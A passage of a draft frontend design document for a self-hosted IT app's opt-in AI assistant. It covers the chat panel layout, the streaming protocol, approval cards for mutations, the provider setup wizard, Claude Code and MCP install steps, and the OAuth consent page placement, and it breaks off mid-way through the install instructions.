---
title: "AI assistant — Frontend surfaces (chat, settings, MCP install, OAuth consent, Manual)"
tags: [design, frontend, web, ai-assistant, mcp, oauth, ux, i18n, manual]
status: draft
created: 2026-09-23
updated: 2026-09-24
---

# AI assistant — Frontend surfaces

> Scope: the **web lane** of lazyit's opt-in AI capability — the navbar chat and its reactive-UI
> contract, the Settings → AI enable/configure flow, the MCP + Claude Code install surface, the
> per-user connected-apps list, the OAuth consent page, and the Manual. This is a *design* document:
> no code, no schema. The backend agent loop, the MCP/OAuth protocol, the tool catalog and the
> security model are sibling slices under `docs/ai-assistant/`; this note **consumes** their
> contracts and states, in §7, exactly what it needs from them.
>
> Labels: **(R)** repository fact (path cited) · **(E)** external fact (URL) · **(C)** conclusion ·
> **(A)** assumption.
>
> **Reconciled with the synthesis (2026-09-23).** The CEO's decisions and the CTO's cross-slice
> reconciliations (R1–R10) are applied throughout. [[ai-assistant/_synthesis|The synthesis]] is binding:
> where this note and the synthesis disagree, the synthesis wins. In particular (R2) a turn is no longer a
> POST that streams its own response: `POST` creates the run and the browser follows
> `GET /ai/runs/:id/events` (fetch-streamed SSE, Bearer, `Last-Event-ID`), consumed by this note's pure
> reducer. The implementation units at the end are superseded by the synthesis's unified wave plan.

---

## 1. Context — what the CEO settled

- AI is **off by default**. Enabling it is a configuration process (provider, model, API key, extra
  settings — all editable later) after which **the app reloads** and a **chat appears in the navbar**
  from which the user controls the app live.
- Providers: **Anthropic, OpenAI, Gemini, OpenAI-compatible (base URL)**. Instance-wide, configured
  by an admin holding `settings:manage`.
- **Actions + reactive UI**: the AI executes backend actions; the UI refreshes affected data by
  itself (a created asset appears in the open list); the AI can navigate the user to an entity. **Not**
  click-by-click UI driving.
- **Every mutation** proposed in chat renders a **preview card** and needs an explicit
  **Approve / Reject** from the user.
- Conversations are **persisted per user** with **configurable retention**; the chat has a history list.
- An **MCP server** for external clients (Claude Code and others) authenticated with **OAuth 2.1
  issued by lazyit**, hence a **consent screen** and a **connected-apps list** where a user revokes
  clients. A **skill** served by the instance: "Install in Claude Code" hands over the pre-configured
  plugin (skill + MCP config). On plain-HTTP `lan` instances, OAuth is replaced by revocable personal
  MCP tokens (CEO, round 2).
- Chat visible only with the new permission **`ai:use`** (ADMIN + MEMBER by default) **and** only
  when AI is enabled. MCP has its own permission, **`ai:connect`** (ADMIN + MEMBER by default), and
  its own switch, independent of the provider (CEO, round 2).
- Every user-facing change updates the Manual (en + es) — [[0062-in-app-help-manual-surface]],
  [[manual-authoring]].
- Standing constraint from issue #1310 (open, `needs-decision`): new features must not add
  Zitadel/OIDC-specific paths; OAuth 2.1 for MCP clients "is issued by lazyit itself on top of the
  local session."

---

## 2. Repository facts (cited)

### 2.1 App shell and navigation

- **(R)** `apps/web/app/(app)/layout.tsx` is an async **Server Component** (shared critical file). It
  renders `SidebarShell` + an inner column wrapped in `AppSecretProvider`; the header cluster is
  `MobileNav · GlobalSearch · ml-auto[ ModeBanner · NotificationBell · ThemeToggle · UserMenu ]`.
  The root is `<div className="flex min-h-svh">`.
- **(R)** `apps/web/app/(app)/template.tsx` **re-mounts on every route change** (the ADR-0049
  `animate-fade-in` settle). Anything that must survive navigation — a chat panel with an in-flight
  stream — must live in the **layout**, never the template or a page.
- **(R)** `apps/web/components/sidebar-nav.tsx` (shared critical) holds the `NAV` registry; the chat
  does **not** need a sidebar entry (the CEO placed it in the navbar), so this design **does not
  touch `sidebar-nav.tsx`**.
- **(R)** `apps/web/components/notification-bell.tsx` is the navbar-popover precedent: a radix
  `Popover` trigger in the header, always rendered for authenticated humans, **polling** a cheap
  count; the API is the real gate.
- **(R)** Keyboard shortcuts in use: `⌘K / Ctrl+K` (global search, `components/global-search.tsx`;
  also the KB quick switcher `kb/_components/kb-quick-switcher.tsx`), `/` (KB list search). No `⌘J`.
- **(R)** `components/ui/` vendors `sheet`, `popover`, `dialog`, `tabs`, `switch`, `textarea`,
  `field`, `status-badge`, `alert-dialog`, `command`, … — **no** radio-group, tooltip or stepper.
  `components/ui/status-badge.tsx` is the Ledger status stamp (ADR-0077: square "ledger tag",
  uppercase, solid AA fill).
- **(R)** `apps/web/components/sidebar-shell.tsx` reads `localStorage` **after** hydration to avoid a
  mismatch — the precedent for persisting "panel open" state.
- **(R)** `apps/web/components/breadcrumb.tsx` humanizes unknown segments (`"ai"` → **"Ai"**); pages
  can pass explicit `items`.
- **(R)** `apps/web/components/user-menu.tsx` links the per-user self-service pages `/profile` and
  `/account/notifications` (no permission gate). `/account/**` is the per-user settings home.

### 2.2 Data layer, permissions, feature state

- **(R)** [[0020-frontend-data-layer]]: endpoints (`lib/api/endpoints/*`, the only `apiFetch`
  callers) → hooks (`lib/api/hooks/*`, TanStack Query, key factories) → components. `notifyError` +
  `RequestIdNote` for errors.
- **(R)** `apps/web/lib/api/query-keys.ts` `createQueryKeys(name)` → `all / lists() / detail(id)`;
  ~40 hand-written factories exist (`assetKeys`, `applicationKeys`, `accessGrantKeys`, `userKeys`,
  `consumableKeys`, `articleKeys`, `infraKeys`, `dashboardKeys`, …). Mutations fan out
  invalidations by hand, e.g. `use-access-grant-mutations.ts` invalidates grants + applications +
  users + dashboard; `use-asset-invalidation.test.ts` exists **because** a missed derived read
  (dashboard) was a real bug (#499).
- **(R)** `apps/web/app/providers.tsx`: one browser `QueryClient`, `staleTime` 60s, 4xx never
  retried, a global 401 → sign-out and 403 `PASSWORD_CHANGE_REQUIRED` → `/change-password` handler.
- **(R)** `apps/web/lib/api/client.ts`: the browser calls the API at the build-time
  `NEXT_PUBLIC_API_URL` (`/api` behind Caddy) with a **Bearer token** from the client session-token
  store (`SessionTokenSync`); `apiFetchBlob` exists for authenticated downloads. **The API is
  Bearer-authenticated, not cookie-authenticated.** There is **no streaming/SSE client** anywhere in
  `apps/web` today (grep for `EventSource`, `text/event-stream`, `getReader()` finds none).
- **(R)** `apps/web/lib/hooks/use-permissions.ts`: `useMyPermissions().can(p)` over
  `GET /config/my-permissions`, **fails closed**, uses `isPending` to avoid hydration mismatch.
- **(R)** Instance feature state today: `GET /config/status` is **public** (`ConfigStatusSchema` in
  `packages/shared/src/schemas/config.ts`: `isConfigured, integrationMode, devMode, csrfToken,
  authMode?, …`), read by `useConfigStatus` (staleTime 30s) and server-side by `apps/web/proxy.ts`.
  SMTP state is **admin-only** (`GET /config/smtp`, `settings:manage`). There is **no general
  per-caller feature-flag endpoint**.
- **(R)** SMTP precedent (`lib/api/endpoints/smtp.ts`, `settings/instance/_components/
  smtp-settings-editor.tsx`): write-only secret (`passwordSet`, never the value), "save first, then
  test", the test endpoint returns HTTP 200 with `{ ok, error? }`.
- **(R)** Permission labels shown in the role editor are localized in
  `messages/{en,es}/settings.json` under `permissionMeta.*`
  (`settings/_lib/permission-labels.ts`) — a new permission needs web copy there.
- **(R)** [[0067-server-prefetch-ssr-strategy]] + [[ssr-prefetch-recipe]]: a page becomes a thin
  async Server Component prefetching its **primary** read with `session.accessToken`; skip for link
  hubs and wizards with no first-paint read; mark skips with `// ponytail:`.

### 2.3 Auth, routing, security headers

- **(R)** `apps/web/proxy.ts`: unauthenticated visitors of non-public paths are redirected to
  `/login` with `callbackUrl = pathname` — **the query string is dropped**
  (`loginUrl.searchParams.set("callbackUrl", pathname)`). `apps/web/lib/utils/safe-redirect.ts`
  `safeInternalPath` already accepts a path **with** a query. *(Fixed in W3-9 — §5.8: the query is kept.)*
- **(R)** `apps/web/app/(auth)/layout.tsx` renders `AuthShell` (wordmark + theme toggle + centered
  column, no app chrome) and does **not** itself require a session.
- **(R)** `apps/web/next.config.ts` sets `X-Frame-Options: DENY` and
  `Content-Security-Policy: frame-ancestors 'none'` on every route; `infra/caddy/Caddyfile` also sets
  `X-Frame-Options DENY`. Clickjacking protection for a consent page already exists.
- **(R)** `infra/caddy/Caddyfile`: the site block applies `encode zstd gzip`, strips `/api` and
  reverse-proxies to `api:3001`; everything else goes to `web:3000`.
- **(R)** [[0087-plain-http-lan-deployment-axis]]: `lan` mode serves **plain HTTP**, host-agnostic,
  `AUTH_MODE=local` only.
- **(R)** `apps/web/app/(app)/assets/diagram/_components/create-agent-wizard.tsx` builds install
  commands from **`window.location.origin`**, "not a baked env: lazyit is self-hosted and
  domain-portable" — with `lib/agent/install-commands.ts` as the pure command builder.

### 2.4 Rendering, design, i18n, Manual, tests

- **(R)** `apps/web/components/markdown-view.tsx` `MarkdownView`: `rehype-sanitize` runs **first**
  (SEC-003/ADR-0029); `disableKbExtensions` drops wiki-links and secret chips. The default schema
  allows `img` with http(s) sources.
- **(R)** `apps/web/components/quick-view-fields.ts` `detailHref()` maps entity → route
  (`/assets/:id`, `/users/:id`, `/applications/:id`, `/locations/:id`, `/kb/:slug`,
  `/assets/diagram?node=…&focus=1`; model/consumable/category have none).
- **(R)** `apps/web/lib/hooks/use-before-unload-guard.ts`: guards **hard** navigations only; "the
  App Router has no stable navigation-guard API" — in-app `router.push` discards unsaved form edits.
- **(R)** [[ledger-design-language]] / [[0077-ledger-design-language-frontend-refactor]]: oxblood =
  the one primary action; stamps for status only; mono + tabular-nums for data; hairline rules over
  heavy cards. [[0049-activated-restraint-ux-direction]]: motion ≤ 220ms, one
  `prefers-reduced-motion` block.
- **(R)** [[0051-i18n-next-intl]] + [[i18n]]: one JSON per top-level namespace
  (`messages/{en,es}/<area>.json`); a **new namespace requires editing the barrels**
  `messages/{en,es}/_all.ts` (foundation files); parity is CI-blocking (`check:message-parity`).
- **(R)** `apps/web/content/manual/_nav.ts` (shared critical) is the manifest of 13 categories; only
  non-empty buckets render; category/subcategory labels live in `messages/{en,es}/help.json`;
  `check:manual-parity` is CI-blocking.
- **(R)** [[0012-testing-strategy]]: no component/DOM runner in `apps/web`; **pure logic extracted
  from components is tested with `bun test`** (72 such test files exist).
- **(R)** Charter: any new dependency touches root `package.json`/`bun.lock` — **shared critical**.
- **(R)** Issue #1310 (open): local auth becomes the only human auth mode; OAuth for MCP is issued by
  lazyit on top of the local session.

---

## 3. External facts (current docs, fetched 2026-09-23)

- **(E)** `EventSource` accepts only `url` + `{ withCredentials }` — **no custom headers, no POST**;
  use `fetch` for authenticated/POST streams.
  <https://developer.mozilla.org/en-US/docs/Web/API/EventSource/EventSource>
- **(E)** AI SDK UI message stream protocol: SSE, header `x-vercel-ai-ui-message-stream: v1`, parts
  `start / text-start|delta|end / reasoning-* / tool-input-start|delta|available /
  tool-approval-request / tool-approval-response / tool-output-available / tool-output-denied /
  data-* / start-step / finish-step / error / finish`, terminated by `data: [DONE]`.
  <https://ai-sdk.dev/docs/ai-sdk-ui/stream-protocol>
- **(E)** AI SDK tool-part states include `approval-requested / approval-responded / output-denied`;
  approval is answered **client-side** with `addToolApprovalResponse()` and continued with
  `sendAutomaticallyWhen`; the older `needsApproval` is **deprecated** in favour of a `toolApproval`
  config; cryptographic verification of approvals is `experimental_toolApprovalSecret`.
  <https://ai-sdk.dev/docs/ai-sdk-ui/chatbot-tool-usage>
- **(E)** AI SDK resumable streams need the `resumable-stream` package + Redis + an
  `activeStreamId`; client aborts become disconnects, so "stop" needs its own endpoint.
  <https://ai-sdk.dev/docs/ai-sdk-ui/chatbot-resume-streams>
- **(E)** `DefaultChatTransport` supports dynamic `headers: () => ({ Authorization })` and
  `prepareSendMessagesRequest` (send only the last message).
  <https://ai-sdk.dev/docs/ai-sdk-ui/transport>
- **(E)** Persisted `UIMessage[]` must be re-validated with `validateUIMessages` on load because of
  schema drift. <https://ai-sdk.dev/docs/ai-sdk-ui/chatbot-message-persistence>
- **(E)** Release cadence (npm registry): `ai` majors 4.0.0 (2024-11-18), 5.0.0 (2025-07-31),
  6.0.0 (2025-12-22), 7.0.0 (2026-06-25); latest `ai@7.0.112`; `@ai-sdk/react@4.0.115` pins
  `ai: 7.0.112` exactly. `@assistant-ui/react` is `0.15.21` (pre-1.0).
  <https://registry.npmjs.org/ai>, <https://registry.npmjs.org/@assistant-ui/react>
- **(E)** assistant-ui `ExternalStoreRuntime`: you own the message state; an adapter
  (`convertMessage`, `onNew`, `onCancel`, `onAddToolResult`, …) bridges to its thread UI.
  <https://www.assistant-ui.com/docs/runtimes/custom/external-store>
- **(E)** TanStack Query: `invalidateQueries()` marks matched queries stale and **refetches only
  actively rendered ones**; with no filter it matches every query; `predicate` filters by `Query`.
  <https://tanstack.com/query/v5/docs/framework/react/guides/query-invalidation>
- **(E)** Caddy `reverse_proxy` flushes immediately for `Content-Type: text/event-stream`; the docs
  say nothing about the interaction with `encode`.
  <https://caddyserver.com/docs/caddyfile/directives/reverse_proxy>
- **(E)** MCP security best practices (2025-11-25): the consent page **MUST** identify the client by
  name, display the scopes, **show the registered `redirect_uri`**, implement CSRF protection, and
  prevent iframing (`frame-ancestors` / `X-Frame-Options: DENY`); consent is per `client_id`.
  <https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices>
- **(E)** Claude Code: `claude mcp add --transport http <name> <url> [--scope local|project|user]`;
  `.mcp.json` `{ "mcpServers": { "<name>": { "type": "http", "url": "…" } } }`; OAuth sign-in via
  `/mcp` or `claude mcp login <name>`. <https://code.claude.com/docs/en/mcp>
- **(E)** Claude Code skills live at `~/.claude/skills/<name>/SKILL.md` (personal) or
  `.claude/skills/<name>/SKILL.md` (project); only `description` is required; supporting files sit
  beside `SKILL.md`. <https://code.claude.com/docs/en/skills>
- **(E)** Claude Code plugin marketplaces can be added from a plain HTTPS URL to `marketplace.json`;
  a plugin may bundle skills **and** MCP servers; the `archive` plugin source is **HTTPS-only**
  (v2.1.224+). <https://code.claude.com/docs/en/plugin-marketplaces>
- **(E)** In-product copilot patterns:
  - **Linear Agent** opens with `⌘J / Ctrl+J`, keeps a chat history, drafts in chat and posts only
    after the user approves, and "operates within your existing permissions" —
    <https://linear.app/docs/linear-agent>.
  - **Notion** agents "propose changes instead of making them directly … approve each one", and
    "nothing changes in a connected tool until you approve it" —
    <https://www.notion.com/releases/2026-08-28>.
  - **GitHub Copilot Chat** asks the user to click **Allow** before an MCP tool action —
    <https://docs.github.com/en/copilot/how-tos/copilot-on-github/copilot-for-github-tasks/using-the-github-mcp-server-from-copilot-chat>.
  - **ServiceNow** agents let a human "review an AI Agent-generated plan and provide … explicit
    approval before execution" —
    <https://servicenow.com/community/now-assist-articles/ai-agents-faq-and-troubleshooting/ta-p/3200454>.

---

## 4. Options per fork

### Fork A — Where the chat lives (information architecture)

| Option | Fit | Cost |
| --- | --- | --- |
| **A1. Header popover** (the bell pattern) | Cheapest; precedent exists | Closes on outside click; covers the very list the CEO wants to see refresh; cramped for approval cards and history. **Rejected.** |
| **A2. Modal `Sheet`** | Vendored primitive | A modal blocks the page — the user cannot watch "the created asset appears in the open list" nor click it. **Rejected on desktop**, fine on phones. |
| **A3. Non-modal side panel** — docked in-flow at `xl`, fixed overlay (no backdrop) at `md`–`xl`, full-screen modal `Sheet` below `md` *(chosen)* | Keeps the page live beside the conversation, which *is* the reactive-UI promise; mounted in the layout, so it survives navigation | A new layout column; responsive switching; focus management owned by us for the non-modal case. |
| **A4. Full-page `/assistant` route** | Room for history | Navigating to the chat unmounts the page it should be controlling. **Rejected for v1.** |

**(C)** Docked only at `xl` (≥1280px): with the 240px rail and a ~400px panel, `lg` (1024px) leaves
~384px of content — too narrow; `xl` leaves ≥640px.

### Fork B — Streaming client and wire protocol

| Option | Pros | Cons |
| --- | --- | --- |
| **B1. AI SDK UI (`@ai-sdk/react` `useChat`)** over the AI SDK UI message stream | Mature state machine; tool-part states incl. approval; dynamic Bearer header; documented protocol | 4 majors in ~20 months, each reshaping `UIMessage` (persisted history must be re-validated on load); `@ai-sdk/react` pins `ai` **exactly**, so web and api would upgrade in lockstep; the approval flow is **client-driven** (the decision rides in a client-resent message, server verification still `experimental_`); `useChat` owns state → a second source of truth beside TanStack Query; adds deps → touches `bun.lock` (shared critical). |
| **B2. assistant-ui** on `ExternalStoreRuntime` + our protocol | Polished thread primitives, a11y, autoscroll | Pre-1.0 (0.15.x); another abstraction to re-theme to the Ledger; still needs our own reducer; new deps. |
| **B3. lazyit-owned protocol + fetch-based SSE reader + pure reducer** *(chosen)* | The contract lives in `@lazyit/shared` (the repo rule); **server-authoritative approvals** via a REST endpoint; persisted shape owned and versioned with the app; the reducer is pure → `bun test` per ADR-0012; **zero new dependencies** (no `bun.lock` contact); history stays in TanStack Query | We write and own ~40 lines of SSE parsing + a reducer + abort handling; no free ecosystem of generative-UI components. |

**(C)** B3, with an event vocabulary deliberately **isomorphic to the AI SDK UI parts** (text
delta, tool call, tool result, approval request) so the backend may still use AI SDK *Core* for the
four providers and map `stream` (v7's rename of `fullStream`) → our events trivially. Owning the wire shape is the cheaper
long-term position given the measured churn.

### Fork C — The UI-effects consumer (tool result → query invalidation)

| Option | Pros | Cons |
| --- | --- | --- |
| **C1. Closed resource vocabulary** in shared (`effects.resources: ["assets", …]`) + a web map resource → key prefixes | Precise refetch | A second hand-maintained fan-out that drifts from the mutation hooks — the exact #499 bug class; every new resource needs a contract change. |
| **C2. Backend emits TanStack keys** | Precise | Leaks web internals into the API. **Rejected.** |
| **C3. On any executed mutation, invalidate every *active* query except the `["ai", …]` subtree** *(chosen)* | Cannot miss a derived read; no drift; no contract beyond `mutated: boolean` on the tool result (R3); TanStack refetches only mounted queries, so cost ≈ the current page's handful of GETs | Slight over-fetch (e.g. a mounted topology map refetches after a KB edit). Acceptable at 5–20 users; a denylist predicate is the escape hatch. |

### Fork D — Navigation to an entity

| Option | Risk |
| --- | --- |
| **D1. Always auto-navigate** when a tool result carries a target | Discards unsaved form edits (the App Router has no in-app guard, §2.4) and yanks the user mid-task. |
| **D2. Never auto-navigate**; always an "Open ‹entity›" chip | Safe; but "take me to Ana's laptop" should just go. |
| **D3. Auto-navigate only for an explicit `navigate`-kind tool** (the user asked to go somewhere) **and** only when no unsaved-changes guard is active; everything else renders an "Open" chip *(chosen)* | Needs a tiny dirty-state registry fed by `useBeforeUnloadGuard`. |

Hrefs are **built by the web** from `{ entity, id, slug? }` (reusing `detailHref`) and validated with
`safeInternalPath` — the backend never sends a raw `href` (no open-redirect / `javascript:` sink).

### Fork E — How the app learns "AI is enabled" and the reload

| Option | Notes |
| --- | --- |
| E1. Add `aiEnabled` to the **public** `GET /config/status` | Tells anonymous visitors the instance runs AI; does not know the caller's `ai:use`. |
| **E2. New authenticated, per-caller `GET /ai/status`** → `{ chat: { available }, mcp: { available }, … }` *(chosen)* | The server combines "enabled + provider configured + caller holds `ai:use`" for chat, and "MCP switch + `ai:connect`" for MCP; the launcher self-gates and **fails closed** (loading, error, **404 on an older API** → nothing renders). |
| E3. SSR-prefetch the status in `layout.tsx` | Avoids an icon pop-in, but adds a server fetch on every hard load and more contact with a shared critical file. **Deferred.** |

Reload: after "Enable", the wizard does a **hard reload** of the admin's tab
(`window.location.assign("/settings/ai?enabled=1")`) — literally what the CEO described, and it
resets any client state. Other users pick the change up on their next status refetch (60s
`staleTime` + refetch-on-focus). Disabling mid-conversation surfaces `AI_DISABLED` on the next send,
which invalidates the status and hides the launcher.

### Fork F — Where "Install in Claude Code" and connected apps live

Settings is `AdminGate`d on `settings:manage` (R). A MEMBER holding `ai:connect` could never reach an
install button placed only there, and a user must revoke **their own** clients.

**(C, decided — R9)** A per-user page **`/account/ai`** ("AI & connected apps", linked from the user menu like
`/account/notifications`) hosts the install panel and the connected-apps list. **Settings → AI**
renders the **same** install panel for admins (satisfying the CEO's placement) plus
instance-level MCP configuration and every user's connected apps.

### Fork G — Skill distribution

| Option | Notes |
| --- | --- |
| **G1. Authenticated zip download + copy-paste commands** *(always available — R8)* | Works on every deployment incl. plain-HTTP LAN; uses `apiFetchBlob`; mirrors the agent-install precedent. |
| G2. Instance-served Claude Code **plugin marketplace** (`/plugin marketplace add https://<host>/…/marketplace.json`, plugin bundles skill + MCP) | One command and auto-updates, but needs **public** endpoints, the `archive` source is **HTTPS-only** (breaks `lan` mode), and it is Claude-Code-specific. **Built (R8), shown only when MCP is enabled on an HTTPS instance.** |

### Fork H — OAuth consent page placement

| Option | Notes |
| --- | --- |
| Inside the `(app)` shell | Sidebar, search and the AI launcher distract from a security decision. **Rejected.** |
| **In the `(auth)` group with `AuthShell`** *(chosen)* | The login/setup visual family; the page enforces the session itself. It is the OAuth authorization endpoint itself, `/oauth/authorize` ([[ai-assistant/mcp-and-oauth|MCP]] §5.2). |

---

## 5. Recommendation

### 5.1 Route map

| Route | Group / shell | Gate (UI; the API is the real gate) | SSR prefetch |
| --- | --- | --- | --- |
| *(panel, no route)* | mounted in `(app)/layout.tsx` | `aiStatus.chat.available` | none (client) |
| `/settings/ai` | `(app)`, `AdminGate` | `settings:manage` | `aiKeys.config()` (primary read) |
| `/account/ai` | `(app)` | `ai:connect`; install panel only if `aiStatus.mcp.available` | `aiKeys.oauthGrantsMine()` |
| `/oauth/authorize?<OAuth params>` | `(auth)` / `AuthShell` | session required server-side (`await auth()` → `/login?callbackUrl=<path+query>`) | the `authorize/validate` read |

Plus a hub card **"AI"** in `settings/page.tsx` `SECTIONS`, a **user-menu** item "AI & connected
apps", and explicit breadcrumb `items` on both new pages (the humanizer would print "Ai").

### 5.2 Component tree — the chat

```
app/(app)/layout.tsx  (server, SHARED CRITICAL — one edit)
└─ <AiAssistantRoot>                       components/ai/ai-assistant-root.tsx (client)
   │  context: { open, view: "chat"|"history", conversationId, pageContext }
   │  gating: useAiStatus() → chat.available  (fails closed; renders children only when off)
   ├─ header …  <AiChatLauncher/>           icon button + ⌘J/Ctrl+J; null unless available
   ├─ inner column (header + breadcrumb + main)  ← unchanged
   └─ <AiChatPanelSlot/>                    xl: docked <aside> · md–xl: fixed overlay · <md: Sheet
        └─ next/dynamic(() => AiChatPanel, { ssr: false })   loaded on first open
             AiChatPanel
             ├─ PanelHeader            title · New chat · History · Close
             ├─ view=history → ConversationHistory      useAiConversations() (Page<T>)
             │     groups Today / Yesterday / 7 days / Older · delete (confirm) · retention note
             └─ view=chat → ConversationView(conversationId)
                  ├─ MessageLog (role="log")
                  │   ├─ UserMessage
                  │   └─ AssistantMessage → parts[]
                  │        ├─ TextPart        → AssistantMarkdown (MarkdownView, chat variant, rAF-throttled)
                  │        ├─ ToolActivity    (read tools: one ledger-tape line, expandable summary)
                  │        ├─ ApprovalCard    (mutations: server preview, Approve/Reject, stamp)
                  │        ├─ EffectChip      ("Open ‹entity›" / "Opened ‹entity›")
                  │        └─ NoticePart      (error / limit / interrupted, with recovery action)
                  ├─ TurnStatus        thinking · awaiting approval · interrupted · stopped
                  ├─ LiveAnnouncer     (visually hidden aria-live="polite", completion-only)
                  └─ Composer          textarea · context chip · Send / Stop · "don't paste secrets" hint
```

Pure logic modules (all `bun test`ed, React-free):

| Module | Responsibility |
| --- | --- |
| `lib/ai/sse-parser.ts` | bytes → SSE `data:` events; chunk-boundary safe; ignores `:` heartbeats |
| `lib/ai/stream-reducer.ts` | `(TurnState, AiRunEvent) → TurnState` over the reconciled run-event union (K4); unknown events ignored |
| `lib/ai/effects.ts` | tool result → `{ invalidate: predicate, navigate?: href, chip?: href }` |
| `lib/ai/entity-href.ts` | `{ entity, id, slug? }` → safe internal href (reuses `detailHref`, `safeInternalPath`) |
| `lib/ai/route-context.ts` | `pathname` → page entity context (the inverse of `entity-href`) |
| `lib/ai/unsaved-changes.ts` | module-level registry that `useBeforeUnloadGuard` also writes |
| `lib/ai/error-kinds.ts` | `AiErrorCode` → i18n key + recovery action (covering-set test) |
| `lib/ai/history-groups.ts` | recency grouping in `DEFAULT_TIME_ZONE` |
| `lib/ai/mcp-snippets.ts` | origin → `claude mcp add …`, `.mcp.json`, generic-client URL; http warning |

Data layer (ADR-0020):
- `lib/api/client.ts` gains `apiFetchStream()`, a sibling of `apiFetchBlob`, so base URL + Bearer
  resolution stay in one place.
- Endpoints: `lib/api/endpoints/ai.ts` (status, conversations, messages, run events, decisions,
  cancel, plugin download),
  `ai-config.ts`, `oauth.ts`.
- Hooks: `use-ai-status.ts`, `use-ai-conversations.ts`, `use-ai-turn.ts` (send / stop / decide —
  owns the `AbortController`), `use-ai-config.ts`, `use-oauth-grants.ts`.
- Keys all live under **one root** `["ai", …]` so the C3 predicate is `q.queryKey[0] !== "ai"`.

**Turn lifecycle (C, reconciled — R2).** `send` POSTs the message and receives `{ runId }`, then
follows `GET /ai/runs/:id/events` with `apiFetchStream`; the reducer builds the in-flight assistant
message from the events; on `run.finished` the final message is written into
`aiKeys.conversation(id)` with `setQueryData` and the list is invalidated. A dropped connection
reconnects with `Last-Event-ID`; after a hard reload the panel re-reads the conversation and, if it
has an active run, re-subscribes (the server answers with `run.snapshot`). After an approval
decision the client re-subscribes. **Stop** calls `POST /ai/runs/:id/cancel`, then aborts the fetch.

### 5.3 Wireframes

**Chat panel (docked, xl)**

```
┌─ lazyit ───────┬──────────────────────────────────────────┬─ Assistant ──────── [+][⟲][×] ┐
│ Dashboard      │ Assets                          [New]    │ ── Today · 14:02 ──────────── │
│ INVENTORY      │ ┌─────────────────────────────────────┐  │ You                           │
│ ▸ Assets       │ │ MBP-042  MacBook Pro 14  Ana Ruiz   │  │ Create a MacBook Air for Juan │
│   Topology     │ │ MBA-017  MacBook Air 13  Juan Pérez │◀─┼─ appeared after approval      │
│ …              │ │ …                                   │  │ Assistant                     │
│                │ └─────────────────────────────────────┘  │ › searched models "air" · 2   │
│                │                                          │ › found user Juan Pérez       │
│                │                                          │ ┌ Approval card (below) ────┐ │
│                │                                          │ └───────────────────────────┘ │
│                │                                          │ Done — [Open MBA-017 ↗]       │
│                │                                          │ ─────────────────────────────  │
│                │                                          │ [About: Assets list ×]        │
│                │                                          │ ┌───────────────────────────┐ │
│                │                                          │ │ Ask lazyit…               │ │
│                │                                          │ └──────────────── [Send ↵] ─┘ │
└────────────────┴──────────────────────────────────────────┴───────────────────────────────┘
```

**Approval card** — rendered **only from the server's structured preview**, never from model prose
(the model could describe one action and request another):

```
┌───────────────────────────────────────────────────────────────┐
│ CREATE · ASSET                                  [PENDING]     │  ← StatusBadge stamp
│ MacBook Air 13 (M4) — new                                     │  ← target label (server-resolved)
│ ─────────────────────────────────────────────────────────────  │
│ Model        —           →  MacBook Air 13 (M4)               │  ← mono, before → after
│ Serial       —           →  C02XK1ZZMD6T                      │
│ Location     —           →  HQ · IT storage                   │
│ Assign to    —           →  Juan Pérez                        │
│ ─────────────────────────────────────────────────────────────  │
│ ⓘ Assigning notifies Juan by email.                           │  ← preview.notes
│                                     [ Reject ]  [ Approve ]   │  ← Approve = the one oxblood action
└───────────────────────────────────────────────────────────────┘
states: PENDING → APPROVING… → EXECUTED ✓ [Open ↗] | FAILED (reason + request id)
        REJECTED | EXPIRED ("ask again") | DECIDED ELSEWHERE (409 from another tab)
```

Rules:
- The Approve button is **not** autofocused, and no global Enter approves anything.
- Each click disables **both** buttons until the server answers (idempotent server side).
- An archive action shows "Archived — can be restored" (soft delete,
  [[0041-soft-delete-reuse-and-restore]]).
- A note of kind `external-side-effect` (e.g. a grant that triggers a provisioning workflow,
  [[0054-applications-workflow-engine]]) is always shown.
- When a step proposes several mutations, v1 shows one card each and has no "Approve all".

**Settings → AI — unconfigured (wizard)**

```
Settings › AI
┌──────────────────────────────────────────────────────────────────────┐
│ Set up the AI assistant                                  Step 2 of 5 │
│ ① Provider ── ② Credentials ── ③ Model ── ④ Test ── ⑤ Enable         │
│ ────────────────────────────────────────────────────────────────────  │
│ Anthropic API key                                                    │
│ [ •••••••••••••••••••••••••••••••••• ]  (write-only, never shown back)│
│ ⓘ What the assistant reads is sent to Anthropic to answer you.       │
│                                          [ Back ]  [ Save & continue ]│
└──────────────────────────────────────────────────────────────────────┘
① Provider: 4 radio cards — Anthropic · OpenAI · Google Gemini · OpenAI-compatible
② Credentials: API key (write-only) · Base URL (OpenAI-compatible only; http:// warned)
   → PUT /config/ai { enabled:false, … }   (saved as a disabled draft — the SMTP pattern)
③ Model: combobox (suggestions from the backend if available, free text always allowed)
   + extras (A): max output tokens · custom instructions · conversation retention
④ Test: POST /config/ai/test → ✓ auth · model · tool calling (latency) | ✗ reason + RequestIdNote
   "Continue" is disabled until the test passes
⑤ Review → egress disclosure checkbox (what leaves the host) → [Enable AI] → PUT { enabled:true }
   → hard reload → callout
   "AI is on — open the assistant with ⌘J"
```

**Settings → AI — configured (editor)**: sectioned cards instead of re-walking the wizard.
- Provider & model: edit, **Replace key** (masked `apiKeySet` field), Test.
- Chat: retention.
- MCP server: toggle, independent of the provider (usable with no provider configured); endpoint URL
  `origin + /mcp` with copy button. On `lan` (plain HTTP) the card explains that clients connect with
  personal tokens, because OAuth needs HTTPS.
- Install in Claude Code (the shared panel).
- Connected apps — all users, with revoke (R9).
- Headless: the per-SA AI access setting (off / read-only / read-write, optional mutation cap per run)
  is edited on each Service Account's page under Settings → Service accounts; this card lists the SAs
  that hold `ai:use` with their setting. Enabling AI access for an SA that holds `infra:report` is
  refused ([[ai-assistant/security|security]] T-35).
- Danger zone: **Turn off AI** (confirm dialog lists the consequences → hard reload).

**`/account/ai`**

The Install in Claude Code panel:
- **HTTPS instance** — one command pair (R8):
  `claude plugin marketplace add <origin>/api/ai/claude-code/marketplace.json` then
  `claude plugin install lazyit@lazyit-<host>` (the marketplace is named after the host — take the name
  from the served `marketplace.json`, [[ai-assistant/mcp-and-oauth|MCP]] §13); run `/mcp` in Claude Code
  to sign in (a browser opens the lazyit consent page). Updates are automatic only once the user enables
  auto-update for the marketplace in `/plugin` → Marketplaces (off by default for third-party
  marketplaces) — say so in the panel.
- **Any instance, including `lan`** — manual (as built, W3-5):
  1. Download the plugin (`GET /api/ai/claude-code/plugin.zip`, `apiFetchBlob`) and unzip the whole
